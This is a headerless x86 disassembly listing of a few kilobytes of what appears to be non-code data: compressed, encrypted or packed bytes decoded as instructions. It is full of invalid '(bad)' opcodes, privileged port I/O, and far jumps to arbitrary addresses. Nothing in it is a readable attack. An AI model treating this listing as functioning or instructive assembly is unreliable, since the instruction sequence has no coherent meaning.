  41b5b4:	mov    edi,fs
  41b5b6:	rol    DWORD PTR [esi-0x14],1
  41b5b9:	test   eax,0xf345d073
  41b5be:	stos   DWORD PTR es:[edi],eax
  41b5bf:	cmp    al,0xe4
  41b5c1:	cwde   
  41b5c2:	dec    ebx
  41b5c3:	and    eax,0xf82e5034
  41b5c8:	xchg   BYTE PTR [edi+0x18],bl
  41b5cb:	sub    eax,0xa1af3ac1
  41b5d0:	add    eax,DWORD PTR [ebp-0x399bc57b]
  41b5d6:	fdivr  QWORD PTR [ebx+0x16b7745e]
  41b5dc:	outs   dx,BYTE PTR ds:[esi]
  41b5dd:	aaa    
  41b5de:	pop    ds
  41b5df:	pop    ecx
  41b5e0:	call   0x949e9d7d
  41b5e5:	cmp    eax,0x79d1ee71
  41b5ea:	or     DWORD PTR [esi+0x7e50fc11],ebp
  41b5f0:	jo     0x41b5dd
  41b5f2:	mov    bl,0xe6
  41b5f4:	mul    DWORD PTR [eax+0x34565d55]
  41b5fa:	shl    dh,1
  41b5fc:	daa    
  41b5fd:	imul   ebp,edi,0xfffffff3
  41b600:	sub    eax,0x8790c0d5
  41b605:	inc    esp
  41b606:	jmp    0x41b63d
  41b608:	adc    BYTE PTR [ebx+0x1e],al
  41b60b:	cmp    DWORD PTR [ebp-0x33],0x72477907
  41b612:	fimul  DWORD PTR [edi-0x2821a7c3]
  41b618:	in     al,0x26
  41b61a:	sub    eax,0x14c89884
  41b61f:	lods   al,BYTE PTR ds:[esi]
  41b620:	or     al,BYTE PTR [eax]
  41b622:	aam    0x69
  41b624:	call   0xd9a:0x7262df4f
  41b62b:	mov    BYTE PTR [ebx+0x8],ah
  41b62e:	repnz cmp al,0x29
  41b631:	ret    
  41b632:	xchg   BYTE PTR [eax-0x6d],dl
  41b635:	xchg   ebp,eax
  41b636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b637:	inc    edi
  41b638:	pop    eax
  41b639:	pop    ebp
  41b63a:	sbb    BYTE PTR [edi+edx*8-0x1a14f8dc],bl
  41b641:	sub    ecx,DWORD PTR [ecx+0x7fe7c62a]
  41b647:	add    sp,WORD PTR [edi-0x60]
  41b64b:	inc    edi
  41b64c:	add    eax,0x1a8cd34a
  41b651:	or     eax,0xdb876481
  41b656:	mov    ecx,0xcb7b94e0
  41b65b:	push   0xffffff8b
  41b65d:	lods   eax,DWORD PTR ds:[esi]
  41b65e:	icebp  
  41b65f:	in     eax,dx
  41b660:	mov    ebp,0x6dcff78a
  41b665:	mov    ebx,0x408042e2
  41b66a:	in     eax,dx
  41b66b:	or     BYTE PTR [edx],ah
  41b66d:	adc    al,0x68
  41b66f:	add    eax,0x36bcc873
  41b674:	xchg   ebp,eax
  41b675:	aam    0xce
  41b677:	fcomp  QWORD PTR ds:0xe8e33b57
  41b67d:	retf   0x5d6b
  41b680:	xor    DWORD PTR [esp+edx*1],ebx
  41b683:	lods   al,BYTE PTR ds:[esi]
  41b684:	pop    esi
  41b685:	loopne 0x41b648
  41b687:	les    esp,FWORD PTR [edx]
  41b689:	cdq    
  41b68a:	test   edx,ecx
  41b68c:	jne    0x41b625
  41b68e:	adc    bh,BYTE PTR [edi]
  41b690:	jne    0x41b6db
  41b692:	inc    esi
  41b693:	test   BYTE PTR [ebx+0xc09f39e],dh
  41b699:	mov    dl,BYTE PTR [ebx-0x796344b6]
  41b69f:	and    dh,BYTE PTR [eax+0x7f]
  41b6a2:	pop    ebp
  41b6a3:	out    0x69,al
  41b6a5:	mov    dl,BYTE PTR ds:0x460e61ce
  41b6ab:	sbb    DWORD PTR [edi-0x7c45b994],ebp
  41b6b1:	leave  
  41b6b2:	pop    ebp
  41b6b3:	adc    eax,0xced6a393
  41b6b8:	das    
  41b6b9:	jnp    0x41b6d3
  41b6bb:	dec    ebp
  41b6bc:	add    al,0x63
  41b6bf:	and    DWORD PTR [ecx-0x71],esi
  41b6c2:	inc    edx
  41b6c3:	mov    edi,0x68a11316
  41b6c8:	loop   0x41b65f
  41b6ca:	add    eax,0xe411a2cc
  41b6cf:	pop    ebx
  41b6d0:	ficomp WORD PTR [ecx-0x27]
  41b6d3:	adc    bh,bh
  41b6d5:	test   al,0x7c
  41b6d7:	sub    al,BYTE PTR [ebx+0x2e]
  41b6da:	xchg   bl,bh
  41b6dc:	fld    DWORD PTR [ebp-0x5659ef90]
  41b6e2:	sbb    DWORD PTR [ecx+0x11],0xa
  41b6e6:	int    0xa5
  41b6e8:	ja     0x41b6e3
  41b6ea:	jns    0x41b70c
  41b6ec:	cmp    dl,bl
  41b6ee:	xor    al,0x95
  41b6f0:	xchg   edx,eax
  41b6f1:	cmp    al,0xe
  41b6f3:	adc    ebx,DWORD PTR [ebx+0x2f]
  41b6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6f7:	jns    0x41b6ab
  41b6f9:	push   esi
  41b6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6fb:	addr16 into 
  41b6fd:	and    BYTE PTR ds:0x452ea3b1,0x2e
  41b704:	mov    al,BYTE PTR [edx]
  41b706:	ja     0x41b69f
  41b708:	js     0x41b6c2
  41b70a:	dec    eax
  41b70b:	push   edi
  41b70c:	sbb    BYTE PTR [edx],dh
  41b70e:	cli    
  41b70f:	mov    al,ds:0xd5d0f59c
  41b714:	lock outs dx,DWORD PTR ds:[esi]
  41b716:	outs   dx,DWORD PTR ds:[esi]
  41b717:	cmc    
  41b718:	push   esi
  41b719:	mov    eax,0xff43fa02
  41b71e:	inc    ebx
  41b71f:	dec    esi
  41b720:	xor    ebx,ecx
  41b722:	mov    bl,0x90
  41b724:	imul   edi,edi,0x58
  41b727:	(bad)  
  41b728:	mov    ?,WORD PTR [ebp+0x36e54a92]
  41b72e:	inc    esp
  41b72f:	je     0x41b6b5
  41b731:	cdq    
  41b732:	loop   0x41b723
  41b734:	cli    
  41b735:	scas   al,BYTE PTR es:[edi]
  41b736:	ret    
  41b737:	fisub  DWORD PTR [eax+0x3641eb7d]
  41b73d:	cmp    al,0xb3
  41b73f:	addr16 in eax,0xa8
  41b742:	mov    ebx,0x45655b39
  41b747:	sub    BYTE PTR [edi+0x13e563af],al
  41b74d:	pop    ecx
  41b74e:	mov    BYTE PTR [esp+edi*4+0x5e],0x17
  41b753:	rcr    DWORD PTR [esi+0x2d7e478f],0x24
  41b75a:	jmp    0x41b704
  41b75c:	xchg   DWORD PTR [eax-0x3c],edx
  41b75f:	(bad)  
  41b760:	ficom  WORD PTR [edi+0x69]
  41b763:	pop    edi
  41b764:	adc    BYTE PTR ds:0x99124eb,ah
  41b76a:	mov    ds:0xd6f3f93,al
  41b76f:	push   0xffffffa2
  41b771:	xchg   edx,eax
  41b772:	jmp    FWORD PTR [ecx+ecx*2+0x62a9c7b6]
  41b779:	dec    eax
  41b77a:	lds    ebp,FWORD PTR [ecx-0x75082e68]
  41b780:	call   0x94a7:0xc5fa5443
  41b787:	cmp    BYTE PTR [esi-0x51],al
  41b78a:	cmp    dl,BYTE PTR [esp+ecx*2-0x47]
  41b78e:	inc    eax
  41b78f:	enter  0x75c1,0xbf
  41b793:	push   edi
  41b794:	jb     0x41b7a5
  41b796:	test   BYTE PTR [edx+ebp*8],cl
  41b799:	pop    ds
  41b79a:	xlat   BYTE PTR ds:[ebx]
  41b79b:	sahf   
  41b79c:	add    BYTE PTR [ebp-0x42],0x44
  41b7a0:	jbe    0x41b796
  41b7a2:	stos   DWORD PTR es:[edi],eax
  41b7a3:	adc    DWORD PTR [ebp+ecx*2+0x5f65260d],0xffffffbc
  41b7ab:	xor    al,0x37
  41b7ad:	pushf  
  41b7ae:	jl     0x41b77f
  41b7b0:	fcmovnb st,st(4)
  41b7b2:	pop    ds
  41b7b3:	sbb    DWORD PTR [edx-0x2eec3b2],ebx
  41b7b9:	add    DWORD PTR [edx],0xffffff99
  41b7bc:	fwait
  41b7bd:	sub    dl,dl
  41b7bf:	adc    eax,0xdb6359f4
  41b7c4:	f2xm1  
  41b7c6:	out    dx,al
  41b7c7:	das    
  41b7c8:	push   cs
  41b7c9:	mov    bl,0x24
  41b7cb:	enter  0x7846,0x73
  41b7cf:	ret    0xebef
  41b7d2:	push   ebp
  41b7d3:	sbb    DWORD PTR [eax-0x9],ecx
  41b7d6:	pop    ecx
  41b7d7:	idiv   ecx
  41b7d9:	outs   dx,DWORD PTR ds:[esi]
  41b7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7db:	shl    edi,0x34
  41b7de:	cmp    al,0x59
  41b7e0:	ret    0xb496
  41b7e3:	cmp    BYTE PTR [eax+0xd1da1c9],0x2
  41b7ea:	mov    al,0x89
  41b7ec:	mov    ah,0xe1
  41b7ee:	scas   al,BYTE PTR es:[edi]
  41b7ef:	jnp    0x41b7ab
  41b7f1:	div    BYTE PTR [ebx-0x42]
  41b7f4:	adc    eax,0xd46245b9
  41b7f9:	jge    0x41b7e3
  41b7fb:	push   si
  41b7fd:	call   0x6afdac0f
  41b802:	loope  0x41b7b5
  41b804:	popa   
  41b805:	cmp    edi,eax
  41b807:	mov    al,0xd2
  41b809:	adc    eax,DWORD PTR [ecx]
  41b80b:	aam    0x6e
  41b80d:	bound  edi,QWORD PTR [edi-0x4f]
  41b810:	inc    esi
  41b811:	dec    edx
  41b812:	dec    esi
  41b813:	mov    esi,esp
  41b815:	mov    dl,0x22
  41b817:	and    al,0xb8
  41b819:	sub    al,0x1e
  41b81b:	xor    WORD PTR [ebp-0x35],dx
  41b81f:	dec    edx
  41b820:	mov    edx,0xd61d1b5b
  41b825:	fcom   QWORD PTR [ecx+0x3e]
  41b828:	hlt    
  41b829:	xor    eax,0x7e8d3a0
  41b82e:	dec    sp
  41b830:	dec    edx
  41b831:	imul   eax,DWORD PTR [ecx],0xffffffca
  41b834:	mov    eax,ds:0xb34a9b0a
  41b839:	adc    ebp,DWORD PTR [edi+ebp*8-0x39]
  41b83d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b83e:	out    dx,eax
  41b83f:	stc    
  41b840:	enter  0x582c,0x40
  41b844:	jge    0x41b7d4
  41b846:	aad    0xd5
  41b848:	(bad)  
  41b84a:	imul   ecx,DWORD PTR [esi+0x442d7d40],0x5a27a9bd
  41b854:	pop    edi
  41b855:	xchg   edx,eax
  41b856:	aaa    
  41b857:	push   cs
  41b858:	sub    eax,0xa7ed5a08
  41b85d:	(bad)  
  41b85e:	aam    0xc7
  41b860:	cmp    BYTE PTR [edi],dl
  41b862:	dec    ebp
  41b863:	add    BYTE PTR [edx+0x1e],bh
  41b866:	or     ecx,esi
  41b868:	dec    esp
  41b869:	popf   
  41b86a:	mov    esi,0x478677bd
  41b86f:	lock xlat BYTE PTR ds:[ebx]
  41b871:	cmp    DWORD PTR [ebp+esi*4-0x36],esi
  41b875:	mov    WORD PTR [edx+0x25d6da8d],ax
  41b87c:	outs   dx,DWORD PTR ds:[esi]
  41b87d:	aam    0x53
  41b87f:	pop    esi
  41b880:	loop   0x41b87a
  41b882:	jp     0x41b8e3
  41b884:	and    eax,0x2a4b9ff8
  41b889:	jnp    0x41b85b
  41b88b:	jbe    0x41b8ac
  41b88d:	jge    0x41b835
  41b88f:	cmp    esi,ecx
  41b891:	or     ch,BYTE PTR ds:0x97d3af0f
  41b897:	cmp    ebp,DWORD PTR [edx]
  41b899:	inc    ecx
  41b89a:	and    al,BYTE PTR [edx-0x16]
  41b89d:	mov    ah,0xae
  41b89f:	jg     0x41b902
  41b8a1:	adc    eax,0x71780dd0
  41b8a6:	cmp    al,0x1f
  41b8a8:	int    0xfb
  41b8aa:	sbb    dl,BYTE PTR [ebp+0x76]
  41b8ad:	pop    ebp
  41b8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8af:	mov    edx,0xd1645094
  41b8b4:	push   es
  41b8b5:	cli    
  41b8b6:	lods   al,BYTE PTR ds:[esi]
  41b8b7:	jl     0x41b84f
  41b8b9:	jp     0x41b8cc
  41b8bb:	pop    ds
  41b8bc:	xchg   edx,eax
  41b8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8be:	(bad)
  41b8c2:	sbb    al,bl
  41b8c4:	enter  0x76da,0xfe
  41b8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8c9:	outs   dx,DWORD PTR cs:[esi]
  41b8cb:	loope  0x41b8c1
  41b8cd:	shl    DWORD PTR [eax],1
  41b8cf:	aad    0xe3
  41b8d1:	jne    0x41b904
  41b8d3:	popa   
  41b8d4:	mov    ecx,DWORD PTR [edx+edi*4-0x7a]
  41b8d8:	jle    0x41b952
  41b8da:	loopne 0x41b902
  41b8dc:	inc    ebx
  41b8dd:	es push ss
  41b8df:	mov    edi,0x372101ef
  41b8e4:	sahf   
  41b8e5:	sbb    DWORD PTR [ebx+0x70527a3c],ebx
  41b8eb:	enter  0xce40,0x3
  41b8ef:	or     al,0xe5
  41b8f1:	ins    DWORD PTR es:[edi],dx
  41b8f2:	iret   
  41b8f3:	push   0xfffffff3
  41b8f5:	jo     0x41b8de
  41b8f7:	sub    BYTE PTR [edx],ah
  41b8f9:	mov    esi,0x4d5cf771
  41b8fe:	sub    BYTE PTR ds:0xbc40963a,cl
  41b904:	xor    bl,cl
  41b906:	mov    edi,DWORD PTR [esi]
  41b908:	ins    BYTE PTR es:[edi],dx
  41b909:	das    
  41b90a:	mov    edi,ss
  41b90c:	push   cs
  41b90d:	mov    BYTE PTR [edi-0x14],bl
  41b910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b911:	xchg   ebx,eax
  41b912:	out    0xa0,eax
  41b914:	out    dx,al
  41b915:	or     BYTE PTR [edx+eiz*4],ah
  41b918:	aad    0xf9
  41b91a:	out    dx,eax
  41b91b:	out    dx,al
  41b91c:	mov    dl,0x5d
  41b91e:	pop    es
  41b91f:	add    eax,0xf8bade89
  41b924:	(bad)  
  41b925:	cmp    eax,0x56572dad
  41b92a:	cmc    
  41b92b:	sti    
  41b92c:	pop    eax
  41b92d:	xor    al,0x33
  41b92f:	push   ecx
  41b930:	mov    al,ds:0xd5dccf93
  41b935:	add    ebx,DWORD PTR ds:0x126b9492
  41b93b:	sbb    eax,0x8948a918
  41b940:	pusha  
  41b941:	xor    BYTE PTR [esi+eax*8-0x4a],bh
  41b945:	pop    esi
  41b946:	pop    edi
  41b947:	stos   BYTE PTR es:[edi],al
  41b948:	cvtps2pi mm0,QWORD PTR [ecx-0x69]
  41b94c:	push   0xffffff93
  41b94e:	in     al,0xc5
  41b950:	mov    ebx,0xced649eb
  41b955:	jp     0x41b9ce
  41b957:	or     ch,BYTE PTR [eax+0x2a]
  41b95a:	mov    DWORD PTR [esi],0x5a7ac2a6
  41b960:	xor    DWORD PTR [edx+ecx*4+0xa],esi
  41b964:	sbb    dl,bl
  41b966:	cmp    al,0x96
  41b968:	mov    ch,0xf6
  41b96a:	adc    al,0x35
  41b96c:	mov    ecx,DWORD PTR [esi+0x5986c5e1]
  41b972:	sahf   
  41b973:	adc    DWORD PTR [eax+0x31],ecx
  41b976:	mov    bl,0x29
  41b978:	adc    DWORD PTR [esi+0x7af2d40b],edi
  41b97e:	sbb    ecx,0x409f61bd
  41b984:	out    dx,eax
  41b985:	xchg   edi,eax
  41b986:	add    DWORD PTR [edx],ebx
  41b988:	rol    DWORD PTR [ebp+0x66],1
  41b98b:	sti    
  41b98c:	and    eax,0xd1fdcc5d
  41b991:	push   ecx
  41b992:	rol    BYTE PTR [edx],cl
  41b994:	mov    WORD PTR [ebx+0xb3f5c71],es
  41b99a:	call   0xc762f1ce
  41b99f:	shl    BYTE PTR [edx],cl
  41b9a1:	pop    edi
  41b9a2:	xchg   DWORD PTR [esi+0x6f835aa9],ebp
  41b9a8:	dec    edi
  41b9a9:	arpl   di,dx
  41b9ab:	fisub  DWORD PTR [esi+0x6e]
  41b9ae:	and    eax,0x998ccee2
  41b9b3:	fs inc edx
  41b9b5:	cmp    edi,ebp
  41b9b7:	add    ebx,DWORD PTR [ecx]
  41b9b9:	mov    esp,0x66e22e75
  41b9be:	pop    esp
  41b9bf:	and    dh,BYTE PTR [ebx+edx*4]
  41b9c2:	push   cs
  41b9c3:	xor    DWORD PTR [ebx-0xcf0d2fd],ebp
  41b9c9:	jp     0x41ba46
  41b9cb:	cdq    
  41b9cc:	jb     0x41b979
  41b9ce:	sbb    eax,0x7ebff279
  41b9d3:	clc    
  41b9d4:	mov    dl,0x1d
  41b9d6:	sahf   
  41b9d7:	ss and dh,ch
  41b9da:	pop    ecx
  41b9db:	daa    
  41b9dc:	mul    DWORD PTR [ecx+edi*1-0x7b229c98]
  41b9e3:	cmp    dl,BYTE PTR [edx-0x75538468]
  41b9e9:	(bad)  
  41b9ea:	pusha  
  41b9eb:	stc    
  41b9ec:	jmp    0x516c:0x62cf255c
  41b9f3:	dec    edi
  41b9f4:	gs dec ebx
  41b9f6:	fld    DWORD PTR [esi+0x2]
  41b9f9:	inc    esp
  41b9fa:	cmp    al,0x98
  41b9fc:	fwait
  41b9fd:	lock xchg ebp,eax
  41b9ff:	push   0xdc98688a
  41ba04:	loop   0x41ba5a
  41ba06:	in     eax,dx
  41ba07:	pop    ds
  41ba08:	add    al,0xc8
  41ba0a:	push   cs
  41ba0b:	fadd   st,st(7)
  41ba0d:	cmp    dh,BYTE PTR [edi+edi*2-0x433d1530]
  41ba14:	add    eax,0x5e4fcb23
  41ba19:	cli    
  41ba1a:	les    esp,FWORD PTR [edx+eax*4]
  41ba1d:	pop    DWORD PTR [esi+0x17]
  41ba20:	jecxz  0x41ba72
  41ba22:	clc    
  41ba23:	jne    0x41b9c9
  41ba25:	inc    ecx
  41ba26:	mov    eax,ds:0x63567f8a
  41ba2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba2c:	and    eax,0xb7b3c395
  41ba31:	add    eax,0x39afcf50
  41ba36:	mov    dl,0x52
  41ba38:	mov    eax,ds:0x405b8edb
  41ba3d:	jbe    0x41ba73
  41ba3f:	(bad)  
  41ba40:	mov    ebp,0x5092eb47
  41ba45:	je     0x41ba0e
  41ba47:	jns    0x41bab4
  41ba49:	rcl    BYTE PTR [ebp+0x3f54564],1
  41ba4f:	(bad)  
  41ba50:	cdq    
  41ba51:	aas    
  41ba52:	test   BYTE PTR [ebx],bh
  41ba54:	mov    ?,WORD PTR [esi+0x7882ea2d]
  41ba5a:	rol    DWORD PTR [edi],0x91
  41ba5d:	lods   al,BYTE PTR ds:[esi]
  41ba5e:	mov    ds:0x9e3a3289,eax
  41ba63:	hlt    
  41ba64:	popf   
  41ba65:	xor    eax,0xc9fc1b88
  41ba6a:	pop    esp
  41ba6b:	repz pop ss
  41ba6d:	adc    ah,0x4
  41ba70:	ret    
  41ba71:	xor    esp,DWORD PTR [eax+0x53]
  41ba74:	out    dx,al
  41ba75:	(bad)  
  41ba76:	pop    ss
  41ba77:	into   
  41ba78:	addr16 sbb bh,bl
  41ba7b:	retf   0xa437
  41ba7e:	jmp    0x70de:0x570e99d5
  41ba85:	xchg   esp,eax
  41ba86:	cld    
  41ba87:	daa    
  41ba88:	aas    
  41ba89:	push   edx
  41ba8a:	push   ss
  41ba8b:	fcom   QWORD PTR [edx]
  41ba8d:	cmp    al,0xb0
  41ba8f:	lods   eax,DWORD PTR ds:[esi]
  41ba90:	push   ds
  41ba91:	sbb    al,0xcb
  41ba93:	(bad)  
  41ba94:	mov    ds:0xc0a59fbc,eax
  41ba99:	sub    DWORD PTR [ebx],ebx
  41ba9b:	neg    BYTE PTR [ebp-0x6037bb4e]
  41baa1:	xchg   ecx,eax
  41baa2:	loopne 0x41bac0
  41baa4:	aaa    
  41baa5:	outs   dx,DWORD PTR ds:[esi]
  41baa6:	mov    ebx,0x888194e7
  41baab:	outs   dx,BYTE PTR ds:[esi]
  41baac:	mov    bl,0x15
  41baae:	imul   esi,DWORD PTR [esi],0xffffffc3
  41bab1:	in     eax,0x33
  41bab3:	cs (bad) 
  41bab5:	jp     0x41ba3f
  41bab7:	in     eax,dx
  41bab8:	stos   BYTE PTR es:[edi],al
  41bab9:	dec    edi
  41baba:	cmp    ecx,DWORD PTR [edx-0x31bc21bf]
  41bac0:	inc    ecx
  41bac1:	aad    0x83
  41bac3:	adc    BYTE PTR [eax],bh
  41bac5:	outs   dx,DWORD PTR ds:[esi]
  41bac6:	xchg   BYTE PTR [eax-0x6152a3cc],al
  41bacc:	outs   dx,DWORD PTR ds:[esi]
  41bacd:	and    DWORD PTR [edi+ecx*1+0x3a50b8c4],esp
  41bad4:	retf   0x5d89
  41bad7:	mul    BYTE PTR [esi-0x58]
  41bada:	je     0x41ba5d
  41badc:	or     DWORD PTR ds:0x326c2644,ebx
  41bae2:	push   eax
  41bae3:	adc    BYTE PTR [esi],bl
  41bae5:	inc    ebp
  41bae6:	inc    eax
  41bae7:	das    
  41bae8:	xchg   esp,eax
  41bae9:	cmp    ebx,ebx
  41baeb:	dec    ecx
  41baec:	sbb    ch,BYTE PTR [ebx-0x608b874e]
  41baf2:	shr    DWORD PTR [ebx],1
  41baf4:	cmp    al,0x24
  41baf6:	aas    
  41baf7:	adc    esi,DWORD PTR [edx+ecx*4-0x65754592]
  41bafe:	sahf   
  41baff:	lds    ecx,FWORD PTR [edi-0x4337e7c4]
  41bb05:	jge    0x41bb64
  41bb07:	jle    0x41bb21
  41bb09:	mov    ebx,fs
  41bb0b:	stos   DWORD PTR es:[edi],eax
  41bb0c:	rcr    DWORD PTR [esi-0xb],cl
  41bb0f:	inc    ecx
  41bb10:	or     ebx,edi
  41bb12:	dec    esp
  41bb13:	and    BYTE PTR [eax+ebp*4+0xf202ee4],bh
  41bb1a:	popa   
  41bb1b:	out    0x96,al
  41bb1d:	or     DWORD PTR [eax],eax
  41bb1f:	cli    
  41bb20:	scas   al,BYTE PTR es:[edi]
  41bb21:	fwait
  41bb22:	sub    al,0x9b
  41bb24:	out    0x4f,al
  41bb26:	into   
  41bb27:	retf   
  41bb28:	loopne 0x41bb17
  41bb2a:	mov    eax,ds:0xce55f0b2
  41bb2f:	scas   al,BYTE PTR es:[edi]
  41bb30:	les    eax,FWORD PTR [ecx]
  41bb32:	retf   
  41bb33:	mov    al,cs:0xd6824ba1
  41bb39:	xor    dh,0x27
  41bb3c:	add    esp,DWORD PTR [edx]
  41bb3e:	adc    al,0x7b
  41bb40:	xor    ebp,DWORD PTR [ebx]
  41bb42:	mov    esp,ecx
  41bb44:	pop    edx
  41bb45:	push   ds
  41bb46:	add    DWORD PTR [ecx],0x4f
  41bb49:	test   al,0xb1
  41bb4b:	ss xchg esp,eax
  41bb4d:	jge    0x41bb83
  41bb4f:	outs   dx,BYTE PTR ds:[esi]
  41bb50:	(bad)  
  41bb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb52:	push   edi
  41bb53:	xchg   ebp,eax
  41bb54:	push   cs
  41bb55:	dec    ebp
  41bb56:	sub    al,0xa9
  41bb58:	pop    ecx
  41bb59:	iret   
  41bb5a:	ror    BYTE PTR [eax-0x60e9de1b],1
  41bb60:	int3   
  41bb61:	sbb    DWORD PTR [edi],esi
  41bb63:	call   0x22775ea9
  41bb68:	adc    al,0xdb
  41bb6a:	xchg   esi,eax
  41bb6b:	in     al,0x2e
  41bb6d:	xchg   edi,eax
  41bb6e:	lahf   
  41bb6f:	cmc    
  41bb70:	and    DWORD PTR ds:0xd8064fbb,0xb
  41bb77:	inc    ebp
  41bb79:	push   edx
  41bb7a:	sbb    al,0x30
  41bb7c:	xchg   ebp,eax
  41bb7d:	mov    edx,0x96c5fee8
  41bb82:	sub    al,BYTE PTR [eax-0x231857fb]
  41bb88:	pop    ebp
  41bb89:	inc    ecx
  41bb8a:	test   eax,0x10c55f34
  41bb8f:	jl     0x41bbbe
  41bb91:	or     eax,DWORD PTR [ebp-0x470d86f]
  41bb97:	adc    eax,0x5dda4724
  41bb9c:	cs xchg ebp,ebp
  41bb9f:	dec    edx
  41bba0:	mov    bl,dh
  41bba2:	es (bad) 
  41bba4:	loop   0x41bbd0
  41bba6:	(bad)  
  41bba7:	into   
  41bba8:	mov    al,ds:0x7da48ecf
  41bbad:	(bad)  
  41bbae:	rol    DWORD PTR [ebx],1
  41bbb0:	mov    ebx,0xebc65ef1
  41bbb5:	inc    eax
  41bbb6:	inc    ecx
  41bbb7:	in     al,dx
  41bbb8:	pop    esi
  41bbb9:	mov    edi,0xdd261d6a
  41bbbe:	add    edi,DWORD PTR [edi]
  41bbc0:	aad    0xf1
  41bbc2:	pop    edi
  41bbc3:	les    ebx,FWORD PTR [edi+0x7c]
  41bbc6:	mov    al,ds:0x992d5c9d
  41bbcb:	push   ecx
  41bbcc:	xchg   ebp,eax
  41bbcd:	loope  0x41bc0c
  41bbcf:	mov    eax,ds:0x12df7696
  41bbd4:	repnz mov al,0xa1
  41bbd7:	pop    esi
  41bbd8:	stos   DWORD PTR es:[edi],eax
  41bbd9:	scas   al,BYTE PTR es:[edi]
  41bbda:	fidivr WORD PTR [ebp+0x5669c9e5]
  41bbe0:	dec    esp
  41bbe1:	imul   ebp,edx,0x2a
  41bbe4:	jo     0x41bc01
  41bbe6:	cmp    ecx,edx
  41bbe8:	in     al,dx
  41bbe9:	push   ebp
  41bbea:	inc    esp
  41bbeb:	add    esp,ebx
  41bbed:	mov    ch,0xb6
  41bbef:	pop    ebx
  41bbf0:	jecxz  0x41bbb3
  41bbf2:	mov    ebp,0xdf5944a7
  41bbf7:	ins    DWORD PTR es:[edi],dx
  41bbf8:	lods   al,BYTE PTR ds:[esi]
  41bbf9:	sub    DWORD PTR [ebx+ebp*8+0x106d83d6],0xc1455b5f
  41bc04:	nop
  41bc05:	aad    0x10
  41bc07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc08:	ja     0x41bc86
  41bc0a:	stos   DWORD PTR es:[edi],eax
  41bc0b:	mov    dh,0xca
  41bc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc0e:	iret   
  41bc0f:	adc    al,0x94
  41bc11:	shl    BYTE PTR [esi-0x7],cl
  41bc14:	or     ebx,edx
  41bc16:	stos   BYTE PTR es:[edi],al
  41bc17:	push   esp
  41bc18:	push   esp
  41bc19:	ja     0x41bc2c
  41bc1b:	lock leave 
  41bc1d:	sar    eax,0xb4
  41bc20:	fmul   DWORD PTR [esi]
  41bc22:	dec    edx
  41bc23:	push   0x60
  41bc25:	pop    esp
  41bc26:	js     0x41bc8d
  41bc28:	ror    DWORD PTR es:[edi+0x6fc7897a],1
  41bc2f:	add    dl,0x34
  41bc32:	push   edi
  41bc33:	je     0x41bca3
  41bc35:	xlat   BYTE PTR ds:[ebx]
  41bc36:	clc    
  41bc37:	push   esp
  41bc38:	dec    eax
  41bc39:	sub    dh,bh
  41bc3b:	mov    esi,0xc1b83ac8
  41bc40:	fidiv  DWORD PTR [ecx+0x10]
  41bc43:	xchg   DWORD PTR ds:[edi-0x64],ebp
  41bc47:	clc    
  41bc48:	repz icebp 
  41bc4a:	ficomp DWORD PTR [ebp+0x62]
  41bc4d:	fincstp 
  41bc4f:	pop    edx
  41bc50:	lods   eax,DWORD PTR ds:[esi]
  41bc51:	mov    esp,0x39032262
  41bc56:	ret    0x1f98
  41bc59:	jmp    DWORD PTR [ebx-0x1a9c309c]
  41bc5f:	dec    edi
  41bc60:	and    BYTE PTR [esi],bh
  41bc62:	pop    edx
  41bc63:	enter  0x759d,0x50
  41bc67:	repz imul ebx,DWORD PTR [ebx-0x2f],0xd87188c9
  41bc6f:	neg    BYTE PTR ds:0x1e06cea9
  41bc75:	or     esi,DWORD PTR [edx]
  41bc77:	cmp    ebp,DWORD PTR [ebx+ebx*1-0x5a]
  41bc7b:	sbb    ebx,DWORD PTR [ebp+0x2f]
  41bc7e:	dec    esi
  41bc7f:	sbb    eax,DWORD PTR [ebx]
  41bc81:	cmp    esi,edi
  41bc83:	inc    eax
  41bc84:	adc    al,0x73
  41bc86:	(bad)  
  41bc87:	clc    
  41bc88:	nop
  41bc89:	sub    DWORD PTR [ebx],0xfffffff0
  41bc8c:	aam    0x54
  41bc8e:	lods   eax,DWORD PTR ds:[esi]
  41bc8f:	fsubr  QWORD PTR [edi-0x50]
  41bc92:	loope  0x41bcb6
  41bc94:	add    bl,BYTE PTR [esi-0x22]
  41bc97:	aam    0xf1
  41bc99:	add    al,0x92
  41bc9b:	loop   0x41bd13
  41bc9d:	or     eax,0x16812020
  41bca2:	push   edx
  41bca3:	out    0xe8,al
  41bca5:	pop    ds
  41bca6:	cmp    eax,0x2d5ac38d
  41bcab:	mov    ds,WORD PTR [esi+edi*1]
  41bcae:	pop    eax
  41bcaf:	dec    DWORD PTR [esi-0x2267153f]
  41bcb5:	push   esp
  41bcb6:	repz sub bh,BYTE PTR [eax+0x4d]
  41bcba:	push   0xc04c40d6
  41bcbf:	lods   eax,DWORD PTR ds:[esi]
  41bcc0:	sub    esp,ebp
  41bcc2:	cmp    dl,BYTE PTR [eax-0x455f084f]
  41bcc8:	sbb    al,0xf8
  41bcca:	js     0x41bc50
  41bccc:	or     DWORD PTR [ebx-0x619eb12b],0xda0ce6a3
  41bcd6:	mov    al,ds:0xcf8992ea
  41bcdb:	fsubr  QWORD PTR [ebx+0x65]
  41bcde:	(bad)  
  41bcdf:	fcom   QWORD PTR [ebp-0x36e2dee6]
  41bce5:	cmp    BYTE PTR [edx-0x473b85f3],bh
  41bceb:	push   ds
  41bcec:	je     0x41bd53
  41bcee:	mov    ds:0xec10c081,eax
  41bcf3:	(bad)  
  41bcf4:	xor    eax,0x4d413f3a
  41bcf9:	(bad)  
  41bcfa:	call   0x2ba6:0xd7ede773
